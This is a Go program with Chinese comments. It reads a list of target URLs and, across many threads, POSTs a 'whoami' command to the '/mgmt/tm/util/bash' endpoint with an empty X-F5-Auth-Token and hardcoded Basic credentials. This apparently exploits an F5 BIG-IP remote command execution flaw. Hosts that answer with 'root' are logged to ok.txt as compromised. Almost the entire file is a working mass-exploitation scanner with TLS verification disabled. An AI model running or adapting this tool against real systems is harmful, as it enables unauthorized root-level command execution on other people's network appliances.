package main
/*
文件内容http://或https://为开头，不是一以此开头的可自行修改代码
本程序为多线程批处理，处理文件名，在代码中修改（有点懒）
*/
import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"runtime"
	"strings"
	"sync"
	"time"
)

var (
	timeout = time.Second * 5
	tr = &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
)
func wite(url string){//创建并写入文件夹
	f, err := os.OpenFile("ok.txt", os.O_APPEND, 0666)
	if err != nil{
		_, err = os.Create("ok.txt")
		return
	}
	_, err =io.WriteString(f, url + "\n")


}
func Http(url string){post := "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}"
	var jsonstr = []byte(post)
	buffer := bytes.NewBuffer(jsonstr)
	client := &http.Client{Timeout: timeout}
	request, err := http.NewRequest("POST",url + "/mgmt/tm/util/bash", buffer)
	request.Header.Set("Authorization", "Basic YWRtaW46QVNhc1M=")
	request.Header.Set("X-F5-Auth-Token", "")
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println(url + "   >>>   请求失败")
		os.Exit(1)
	}
	response, _ := client.Do(request)
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	ret := regexp.MustCompile(`root`)
	alls := ret.FindAllString(string(body), -1)
	if alls != nil {
		fmt.Println(url+ "   >>>   " + alls[0])
	}
}

func Https(url string){
	post := "{\"command\":\"run\",\"utilCmdArgs\":\"-c whoami\"}"
	var jsonstr = []byte(post)
	buffer := bytes.NewBuffer(jsonstr)
	client := &http.Client{Transport: tr, Timeout: timeout}
	request, err := http.NewRequest("POST",url + "/mgmt/tm/util/bash", buffer)
	request.Header.Set("Authorization", "Basic YWRtaW46QVNhc1M=")
	request.Header.Set("X-F5-Auth-Token", "")
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		fmt.Println(url + "   >>>   请求失败")
		os.Exit(1)
	}
	response, _ := client.Do(request)
	defer response.Body.Close()
	body, _ := ioutil.ReadAll(response.Body)
	ret := regexp.MustCompile(`root`)
	alls := ret.FindAllString(string(body), -1)
	if alls != nil {
		fmt.Println(url+ "   >>>   " + alls[0])
		wite(url)
	}
}
func Url(url <- chan string, wg *sync.WaitGroup){
	for url := range url{
		if !strings.HasPrefix(url, "https"){
			Http(url)
		}else{
			Https(url)
		}
	}
	wg.Done()
}
func main(){
	max := runtime.NumCPU() * 5
	var wg sync.WaitGroup
	wg.Add(max)
	ch := make(chan string)
	for i := 0; i < max; i++{
		go Url(ch, &wg)
	}
	file, _ := os.Open("ip.txt")
	defer file.Close()
	buf := bufio.NewScanner(file)
	for buf.Scan(){
		ch <- buf.Text()
	}
	close(ch)
	wg.Wait()
}
